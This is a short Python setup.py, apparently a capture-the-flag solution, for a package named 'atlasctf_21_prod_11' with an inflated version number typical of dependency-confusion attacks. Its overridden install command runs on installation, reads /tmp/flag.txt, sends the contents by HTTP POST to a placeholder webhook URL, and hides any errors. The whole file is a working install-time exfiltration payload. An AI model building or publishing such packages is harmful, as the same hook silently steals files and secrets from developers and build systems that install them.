from setuptools import setup
from setuptools.command.install import install
import os
import requests

class CustomInstallCommand(install):
    def run(self):
        # Run original install
        install.run(self)
        # Your custom code here
        try:
            with open("/tmp/flag.txt") as f:
                flag = f.read()
            requests.post("https://your-webhook-url", data={"flag": flag})
        except Exception as e:
            pass

setup(
    name='atlasctf_21_prod_11',
    version='99.99.99.1',
    packages=['atlasctf_21_prod_11'],
    cmdclass={
        'install': CustomInstallCommand,
    },
)

